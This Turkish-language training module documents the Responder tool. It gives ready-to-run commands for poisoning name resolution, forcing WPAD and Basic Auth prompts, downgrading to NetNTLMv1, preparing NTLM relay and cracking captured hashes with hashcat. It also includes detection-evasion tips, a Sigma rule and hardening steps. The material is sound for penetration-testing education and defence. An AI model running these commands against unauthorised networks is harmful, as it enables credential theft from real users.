# Responder

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** LLMNR, NBT-NS ve mDNS protokollerini zehirleyerek yerel ağdaki Windows istemcilerini sahte kimlik doğrulama servislerine yönlendiren, NetNTLMv1/v2 hash'lerini toplayan ve WPAD saldırılarını yöneten endüstri standardı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**Responder** (Laurent Gaffie tarafından geliştirilen), yerel ağ (LAN) katmanında isim çözümleme (Name Resolution) zafiyetlerini istismar eden son derece güçlü bir ortadaki adam (MitM) ve kimlik hasat etme platformudur. Windows işletim sistemleri, DNS sunucusundan bir ana bilgisayar adını çözemediğinde sırasıyla **LLMNR** (Link-Local Multicast Name Resolution - UDP 5355) ve **NBT-NS** (NetBIOS Name Service - UDP 137) protokolleri üzerinden yerel ağa broadcast/multicast sorguları gönderir. Responder, ağ arayüzünü dinleyerek bu çağrılara sahte "O makine benim ve IP adresim bu!" yanıtları döner; ardından kurbanı kendi üzerindeki sahte SMB, HTTP, MSSQL, FTP, LDAP veya Kerberos servislerine bağlayarak istemcinin **NetNTLMv1** veya **NetNTLMv2** kimlik doğrulama hash'lerini ele geçirir.

Ayrıca Responder bünyesinde barındırdığı sahte **WPAD** (Web Proxy Auto-Discovery) sunucusu sayesinde kurban istemcilerin web trafiğini kendi üzerinden tünelleme ve HTTP tabanlı temel/NTLM kimlik doğrulama pencereleri açtırma yeteneğine sahiptir.

```
       [ Kurban İstemci (Windows) ]
                 |
   1. DNS Başarısız: "FILESERVER01 nerede?"
                 |
   2. UDP 5355 (LLMNR Broadcast): "FILESERVER01 kimde?"
                 v
     ============================================= Yerel Ağ (L2 Broadcast)
                 |
                 +---------------------------------> [ Responder (Saldırgan) ]
                                                            |
   3. Sahte Yanıt: "FILESERVER01 benim! IP: 192.168.1.50" <--+
                 |
   4. SMB Bağlantısı (TCP 445): \\FILESERVER01\share
                 |
   5. NTLM Challenge / Response Değişimi
                 v
         [ Responder ] ===> NetNTLMv2 Hash Yakalandı! (JTR / Hashcat Formatında)
```

### Neden Önemli?
- **Sıfır Bilgi ile Erişim:** Ağda hiçbir kullanıcı adı veya parolaya sahip olmadan (Unauthenticated), yalnızca bir ağ kablosu takılarak veya Wi-Fi ağına dahil olunarak etki alanı kullanıcılarının (bazen Domain Admin'lerin) hash'lerini saniyeler içinde yakalayabilir.
- **Relay Entegrasyonu:** Responder'ın yerleşik SMB ve HTTP sunucuları kapatılarak gelen kimlik doğrulama istekleri `ntlmrelayx` veya `impacket` araçlarına yönlendirilebilir (SMB/LDAP/ADCS Relay).
- **Zengin Protokol Desteği:** HTTP, HTTPS, SMB, MSSQL, FTP, POP3, IMAP, SMTP, DNS, LDAP, RDP ve Kerberos gibi onlarca servisin sahtesini eşzamanlı çalıştırabilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Responder | Inveigh | mitm6 |
|---|---|---|---|
| **Çalışma Platformu** | Linux (Python 3) | Windows (.NET / PowerShell) | Linux (Python 3) |
| **Ana Protokoller** | LLMNR, NBT-NS, mDNS, WPAD | LLMNR, NBT-NS, mDNS, DNS | IPv6 DHCPv6, DNS |
| **Kullanım Aşaması** | Dışarıdan bağlanan saldırgan / Kali | Ele geçirilmiş Windows kurban makine | Yerel ağda IPv6 üzerinden MitM |
| **Rogue Servisler** | SMB, HTTP, MSSQL, FTP, LDAP, Kerb | SMB, HTTP, HTTPS, Proxy | Yalnızca Sahte DNS / DHCPv6 |
| **Relay Yeteneği** | Kısmi (ntlmrelayx'e yönlendirir) | Dahili HTTP/SMB relay desteği | ntlmrelayx ile birlikte çalışır |
| **Ağ Gürültüsü** | Yüksek (L2 Multicast/Broadcast) | Yüksek / Orta | Orta (Yalnızca IPv6 DNS istekleri) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Responder doğrudan kök izinleriyle (root/sudo) çalıştırılır çünkü 1024'ün altındaki ayrıcalıklı portları (UDP 137, 5355, 53; TCP 80, 445 vb.) dinlemek zorundadır.

```bash
sudo responder -I <Ağ_Arayüzü> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-I, --interface` | Dinlenecek ve zehirleme yapılacak ağ arayüzü (Zorunlu). | `-I eth0`, `-I ens33` |
| `-A, --analyze` | **Analiz Modu:** Ağdaki istekleri dinler ve raporlar; hiçbir yanıt dönmez (Sıfır gürültü / OPSEC). | `sudo responder -I eth0 -A` |
| `-b, --basic` | HTTP kimlik doğrulamasında Basic Auth penceresi açmaya zorlar (Açık metin parola avı). | `-b` |
| `-r, --wredir` | WPAD yanıtı alan istemcileri sahte bir kimlik doğrulama sayfasına yönlendirir. | `-r` |
| `-d, --DHCP` | Sahte DHCP yanıtları enjekte ederek istemcilere rogue WPAD sunucu adresi atar. | `-d` |
| `-w, --wpad` | Sahte WPAD proxy sunucusunu aktif eder (Rogue wpad.dat dosyası sunar). | `-w` |
| `-u, --upstream-proxy` | Saldırgan arkasındaki gerçek proxy sunucu adresi (Trafiğin kesilmemesi için). | `-u http://192.168.1.1:8080` |
| `-F, --ForceWpadAuth` | WPAD üzerinden dosya veya sayfa indirmek isteyen istemcileri NTLM doğrulamaya zorlar. | `-F` |
| `--lm` | LM kimlik doğrulama seviyesini düşürmeye (downgrade) çalışarak NetNTLMv1 zorlar. | `--lm` |
| `--disable-ess` | Extended Session Security (ESS) özelliğini devre dışı bırakarak NetNTLMv1'i kırmayı kolaylaştırır. | `--disable-ess` |
| `-v, --verbose` | Ayrıntılı terminal çıktısı sağlar; gelen her isteğin detayını gösterir. | `-v` |
| `-e, --exclude` | Zehirleme yapılmayacak hedef IP adresleri virgülle ayrılarak belirtilir (DC/Gateway koruma). | `-e 192.168.1.1,192.168.1.10` |
| `-i, --ip` | Saldırgan makinenin manuel olarak duyuracağı sahte yanıt IP adresi (Çoklu arayüz senaryoları). | `-i 192.168.1.50` |
| `-P, --proxyauth` | Proxy yetkilendirmesi için kullanıcı adı/parola doğrulaması talep eder. | `-P` |

### Responder Modül ve Servis Ağacı (`Responder.conf`)

`/etc/responder/Responder.conf` (veya aracın dizinindeki dosya) üzerinden sahte sunucular açılıp kapatılabilir:

```ini
[Responder Core]
; Protokol Zehirleyicileri (Açık: On / Kapalı: Off)
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
LLMNR = On
NBTNS = On
MDNS = On

[Responder SSL]
; SSL/TLS Sertifika Ayarları
SSL_Certificate = certs/responder.crt
SSL_Key = certs/responder.key
```

> **Önemli İpucu:** Eğer `ntlmrelayx` ile NTLM Relay saldırısı yapılacaksa, `Responder.conf` içinde mutlaka `SMB = Off` ve `HTTP = Off` yapılmalıdır; aksi halde Responder port 445 ve port 80'i işgal ederek relay motorunun bağlanmasını engeller.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Pasif Ağ Dinleme ve İstek Analizi (Analyze Mode)

Ağda aktif zehirleme yapmadan önce hangi makinelerin LLMNR ve NBT-NS yayını yaptığını tespit etmek için kullanılır. Hiçbir paket gönderilmez; tamamen pasiftir.

```bash
sudo responder -I eth0 -A
```

```text
[+] Listening for events...
[*] [LLMNR]  Request: 'HR-PRINTER' from 192.168.1.105 (Analyzed only)
[*] [NBT-NS] Request: 'CORP-DC01' from 192.168.1.112 (Analyzed only)
[*] [MDNS]   Request: 'MacBook-Pro.local' from 192.168.1.140 (Analyzed only)
```
*Analiz:* Ağda isim çözümleme hataları yaşayan kurban IP'leri (192.168.1.105 ve 112) belirlendi. Aktif saldırıya geçildiğinde bu makinelerin kolaylıkla hedef alınabileceği kanıtlandı.

---

### Senaryo 2: Standart Zehirleme ve NetNTLMv2 Hash Yakalama

En yaygın sızma testi komutudur. Ayrıntılı mod, WPAD ve DHCP desteği ile başlatılır.

```bash
sudo responder -I eth0 -dwv
```

```text
[+] [LLMNR]  Poisoned answer sent to 192.168.1.105 for name BACKUP-SRV
[+] [SMB] NTLMv2-SSP Client   : 192.168.1.105
[+] [SMB] NTLMv2-SSP Username : LAB\ahmet.yilmaz
[+] [SMB] NTLMv2-SSP Hash     : ahmet.yilmaz::LAB:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
[+] [SMB] Hash written to /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.105.txt
```
*Analiz:* Kurban `192.168.1.105`, var olmayan `BACKUP-SRV` sunucusuna bağlanmaya çalışırken Responder araya girdi. Kurbanın makinesi saldırgana SMB bağlantısı kurdu ve `ahmet.yilmaz` kullanıcısının NetNTLMv2 hash'i yakalanarak diske kaydedildi.

---

### Senaryo 3: Sahte WPAD Enjeksiyonu ve Zorlamalı Kimlik Doğrulama

Kurbanların internete çıkarken tarayıcılarının otomatik proxy aramasını (WPAD) suistimal eder.

```bash
sudo responder -I eth0 -w -F -b
```

```text
[*] [WPAD] Providing wpad.dat file to 192.168.1.120
[+] [HTTP] Basic Auth sent to 192.168.1.120
[+] [HTTP] Cleartext Client   : 192.168.1.120
[+] [HTTP] Cleartext Username : LAB\mehmet.demir
[+] [HTTP] Cleartext Password : Password123!
```
*Analiz:* İstemcinin tarayıcısı WPAD sorgusu yaptığında Responder sahte proxy dosyasını iletti ve Basic Authentication penceresi tetikledi. Kullanıcının girdiği açık metin parola anında yakalandı.

---

### Senaryo 4: NetNTLMv1 Downgrade Saldırısı

Eğer hedef ortamda NTLMv1 desteği tamamen kapatılmamışsa (`LmCompatibilityLevel` <= 2), kimlik doğrulamayı NetNTLMv1'e düşürerek 56-bit DES tabanlı hızlı kırma yapılabilir.

```bash
sudo responder -I eth0 --lm --disable-ess -v
```

```text
[+] [SMB] NTLMv1 Client   : 192.168.1.130
[+] [SMB] NTLMv1 Username : LAB\sql_service
[+] [SMB] NTLMv1 Hash     : sql_service::LAB:3385208577F1439D...:0000000000000000...
[*] Note: NetNTLMv1 can be cracked with rainbow tables / crack.sh in minutes!
```
*Analiz:* ESS devre dışı bırakılarak istemcinin NetNTLMv1 yanıtı vermesi sağlandı. Bu format Hashcat veya çevrimiçi DES çözücüler ile dakikalar içinde açık metne dönüştürülebilir.

---

### Senaryo 5: NTLM Relay İçin Responder'ı Hazırlama (Relay Modu)

`Responder.conf` dosyasında SMB ve HTTP kapatıldıktan sonra çalıştırılır; böylece Responder yalnızca zehirler, kimlik doğrulamayı arka plandaki `ntlmrelayx` devralır.

```bash
# Responder.conf düzenleme: SMB = Off, HTTP = Off
sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf

# Responder'ı başlat
sudo responder -I eth0 -v
```

```text
[+] [LLMNR]  Poisoned answer sent to 192.168.1.115 for name APPSRV01
[*] Responder poisoned the name, traffic forwarded to ntlmrelayx (port 445/80)
```
*Analiz:* Responder SMB portunu dinlemediği için `192.168.1.115` kurbanı `ntlmrelayx`'e bağlanarak etki alanı sertifika servisine (AD CS PKINIT) veya LDAP servisine başarıyla relay edildi.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[!] Error starting TCP server on port 445: [Errno 98] Address already in use` | Yerel makinede SMB servisi (Samba `smbd` veya Windows dosya paylaşımı) çalışıyor. | `sudo systemctl stop smbd nmbd` komutu ile yerel SMB servisini durdurun veya `ss -tulpn \| grep 445` ile PID'yi bulup sonlandırın. |
| `[!] Error starting UDP server on port 53: Address already in use` | Linux üzerinde `systemd-resolved` veya `dnsmasq` port 53'ü işgal ediyor. | `sudo systemctl stop systemd-resolved` veya `Responder.conf` içinde `DNS = Off` yapın. |
| `No LLMNR/NBT-NS queries received` (Hiçbir istek düşmüyor) | 1. Yanlış ağ arayüzü seçildi.<br>2. Ağ switch'i IGMP/Multicast trafiğini engelliyor.<br>3. Ortamda LLMNR/NBT-NS GPO ile kapatılmış. | Doğru arayüzü (`ip a`) kontrol edin. Wireshark/tcpdump ile `port 5355 or port 137` dinleyerek yayın olup olmadığını doğrulayın. Pasif kalınca `mitm6` veya zorlamalı tetikleyicilere (PetitPotam/Coercer) geçin. |
| `Browser hanging / Network connection lost on clients` | `-w` (WPAD) aktif edildi ancak `--upstream-proxy` belirtilmedi; kurbanların internet trafiği Responder'da kilitlendi. | İstemcilerin internetini kesmemek için gerçek proxy adresini `-u http://proxy:port` olarak girin veya operasyon bitince `-w` bayrağını kaldırın. |
| `Captured hash has empty username / Computer account ($)` | Makine hesabı (SYSTEM context) bir paylaşım aradı. | Makine hash'leri (`DC01$`) parola kırma için zordur; Silver Ticket veya S4U2self saldırılarında kullanılabilir ya da kullanıcı hesapları hedeflenmelidir. |
| `[!] Error binding to interface: Cannot assign requested address` | Sanal makinede ağ bağdaştırıcısı köprü (Bridge) modunda değil veya IP adresi alınamamış. | Ağ adaptörünüzün DHCP'den geçerli bir yerel IP aldığını doğrulayın (`dhclient eth0`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Windows Event ID 4624 / 4625 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Failure Reason: Bilinmeyen kullanıcı adı veya hatalı parola denemeleri.
  - Workstation Name: Responder'ın simüle ettiği sahte sunucu adı.
- **Windows Event ID 5140 / 5145:** Ağ paylaşımına erişim denemeleri (`\\CORP-SRV01\IPC$`).
- **Sysmon Event ID 3 (Network Connection):**
  - İstemci makinelerin bilinmeyen bir saldırgan IP'sine doğru UDP 5355, UDP 137, TCP 445 veya TCP 80 bağlantıları kurması.
- **Sysmon Event ID 22 (DNS Query):**
  - `wpad` veya var olmayan isimler için arka arkaya yapılan DNS sorgularının başarısız olup multicast'e düşmesi.

### 5.2 Ağ ve EDR İmzaları
- **Multicast Yanıt Anomalisi:** LLMNR isteklerine ağda aynı anda yanıt veren cihazlar veya anormal hızda dönen unicast UDP 5355 yanıtları (Snort/Suricata: `ET CURRENT_EVENTS Potential LLMNR Poisoning Responder`).
- **TTL ve Banner Uyumsuzluğu:** Responder'ın sunduğu sahte SMB veya HTTP banner'larının standart Windows Server imzalarıyla uyuşmaması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | İsim çözümleme trafiğini zehirleme ve kimlik çalma. |
| **T1187** | Forced Authentication | Kurbanı sahte SMB/HTTP sunucusuna bağlanmaya zorlama. |
| **T1040** | Network Sniffing | Ağ paketlerini ve kimlik doğrulama hash'lerini dinleme. |
| **T1110.002** | Brute Force: Password Cracking | Yakalanan NetNTLMv2 hash'lerinin çevrimdışı kırılması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Ağ Kesintisi Riski:** WPAD kurbanların trafiğini kesebilir. | `-w` bayrağını rastgele açmayın. Gerekirse upstream proxy belirtin veya yalnızca `-I eth0` ile LLMNR dinleyin. |
| **Domain Controller Alarmı:** DC'lerin isteklerini zehirlemek yüksek alarm üretir. | `/etc/responder/Responder.conf` altındaki `DontName` parametresine DC ve Kritik sunucu adlarını ekleyin. |
| **Gereksiz Gürültü:** Tüm ağa yanıt dönmek IDS/IPS sistemlerini tetikler. | Hedef IP bazlı filtreleme yapmak için `-e <Hedef_IP>` (Exclude) veya konfigürasyondan whitelist tanımlayın. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — LLMNR Zehirleme Tespiti)
```yaml
title: Potential LLMNR/NBT-NS Poisoning Activity
status: experimental
description: Ağda tek bir IP'den dönen çok sayıda LLMNR/NBT-NS yanıtı ve bilinmeyen makineye SMB bağlantısı.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        DestinationPort:
            - 5355
            - 137
        Protocol: udp
    condition: selection | count() by DestinationIp > 50
level: high
```

#### Sertleştirme Adımları
1. **LLMNR'ı Devre Dışı Bırakma:**
   - GPO Yolu: `Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn off multicast name resolution` -> **Enabled**.
2. **NBT-NS'i Kapatma:**
   - DHCP Scope ayarlarından veya ağ bağdaştırıcısı özelliklerinden: `WINS -> Disable NetBIOS over TCP/IP`.
3. **WPAD Koruması:**
   - Şirket DNS sunucusuna `wpad` adına boş bir `A` kaydı girilerek (Sinkholing) istemcilerin yerel ağda yayın yapması engellenmelidir.
4. **SMB ve LDAP İmzalama (Signing):**
   - Tüm etki alanında SMB Signing zorunlu (`RequireSecuritySignature = True`) yapılarak hash'lerin relay edilmesinin önüne geçilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Pasif analiz modu (Ağda kim yayın yapıyor dinle, paket atma)
sudo responder -I eth0 -A
```
- **Ne Yapar?:** Ağa hiçbir sahte yanıt göndermeden LLMNR ve NBT-NS isteklerini kaydeder.
- **Ne Zaman Kullanılır?:** Operasyonun keşif safhasında, OPSEC kurallarının sıkı olduğu ortamlarda.
- **Parametreler:** `-I eth0`: Arayüz; `-A`: Analiz modu.

```bash
# 2. Standart ve agresif hash yakalama (En popüler komut)
sudo responder -I eth0 -dwv
```
- **Ne Yapar?:** LLMNR/NBT-NS zehirler, sahte WPAD ve DHCP enjeksiyonu yapar, detaylı log üretir.
- **Ne Zaman Kullanılır?:** Yerel ağa ilk fiziksel/VPN bağlantısı sağlandığında hızlı hash hasadı için.
- **Parametreler:** `-d`: DHCP enjeksiyonu; `-w`: Sahte WPAD; `-v`: Verbose mod.

```bash
# 3. Yalnızca belirli bir arayüzde sessiz zehirleme (WPAD olmadan)
sudo responder -I eth0
```
- **Ne Yapar?:** Tarayıcı proxy'sine dokunmadan yalnızca dosya paylaşımı arayan kurbanların NetNTLM hash'lerini yakalar.
- **Ne Zaman Kullanılır?:** Kullanıcıların internet trafiğini riske atmadan güvenli çalışmak istendiğinde.
- **Parametreler:** `-I eth0`: Çalışılacak ethernet portu.

```bash
# 4. Açık metin parola avı (Basic Auth enjeksiyonu)
sudo responder -I eth0 -w -F -b
```
- **Ne Yapar?:** HTTP isteklerinde sahte kimlik doğrulama penceresi açarak açık metin kullanıcı adı/parola çeker.
- **Ne Zaman Kullanılır?:** Ortamdaki kullanıcıların proxy sorguları yoğun olduğunda.
- **Parametreler:** `-w`: WPAD; `-F`: Force WPAD Auth; `-b`: Basic Auth zorla.

```bash
# 5. NetNTLMv1 Downgrade ve ESS kapatma
sudo responder -I eth0 --lm --disable-ess
```
- **Ne Yapar?:** Eski Windows istemcilerini veya uyumlu sunucuları kırması kolay olan NetNTLMv1 formatına zorlar.
- **Ne Zaman Kullanılır?:** Yakalanan v2 hash'leri uzun ve karmaşık olduğunda, v1 üzerinden hızlı kırma denemek için.
- **Parametreler:** `--lm`: LM desteğini aç; `--disable-ess`: Extended Session Security iptal et.

```bash
# 6. Belirli IP adreslerini zehirleme dışı bırakma (Exclude List)
sudo responder -I eth0 -e 192.168.1.1,192.168.1.10
```
- **Ne Yapar?:** Gateway ve Domain Controller IP'lerinden gelen istekleri görmezden gelir, cevap dönmez.
- **Ne Zaman Kullanılır?:** Ağ altyapısını bozmamak ve güvenlik izleme sistemlerine takılmamak için.
- **Parametreler:** `-e`: Hariç tutulacak IP adresleri listesi.

```bash
# 7. Manuel yanıt IP'si atayarak zehirleme (Multi-homed Routing)
sudo responder -I eth0 -i 192.168.1.50 -v
```
- **Ne Yapar?:** Çoklu IP adresine sahip makinelerde sahte yanıtlarda kullanılacak IP'yi manuel sabitler.
- **Ne Zaman Kullanılır?:** Saldırgan cihazı birden fazla VLAN veya ağ arayüzüne bağlı olduğunda.
- **Parametreler:** `-i 192.168.1.50`: Sahte yönlendirme IP'si.

```bash
# 8. Yakalanan hash'leri Hashcat formatında inceleme
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```
- **Ne Yapar?:** Responder tarafından diske kaydedilmiş tüm NetNTLMv2 hash'lerini listeler.
- **Ne Zaman Kullanılır?:** Parola kırma motoruna (Hashcat Mode 5600) hash'leri aktarmadan önce.
- **Parametreler:** Standart Linux dosya okuma komutu.

```bash
# 9. Hashcat ile yakalanan NetNTLMv2 hash'lerini kırma
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt -O
```
- **Ne Yapar?:** Yakalanan NetNTLMv2 hash'lerini RockYou sözlüğü ile GPU hızlandırmalı kırar.
- **Ne Zaman Kullanılır?:** Hash yakalandıktan hemen sonra açık metin parolayı elde etmek için.
- **Parametreler:** `-m 5600`: NetNTLMv2 hash modu; `-O`: Optimize edilmiş çekirdekler.

```bash
# 10. ntlmrelayx öncesi Responder SMB/HTTP servislerini kapatıp başlatma
sudo responder -I eth0 -v
```
- **Ne Yapar?:** `Responder.conf` içinde `SMB=Off` ve `HTTP=Off` yapıldığında relay saldırılarına isim çözümleme desteği sağlar.
- **Ne Zaman Kullanılır?:** LDAP veya AD CS relay operasyonlarında kimlik doğrulamanın başka porta yönlendirilmesi gerektiğinde.
- **Parametreler:** `-I eth0`: Arayüz; `-v`: Verbose mod.

---

## Kaynaklar

- **Resmi GitHub Deposu:** [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
- **MITRE ATT&CK T1557.001:** [https://attack.mitre.org/techniques/T1557/001/](https://attack.mitre.org/techniques/T1557/001/)
- **Microsoft Dokümantasyonu (LLMNR & NBT-NS):** [https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753940(v=ws.10)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753940(v=ws.10))

---

> **Önceki:** [← Spray-Passwords](../Kategori_03_Dizin_Kesfi_Graf_Analizi_ve_Haritalama/Spray-Passwords.md) · **Sonraki:** [Inveigh →](./Inveigh.md)
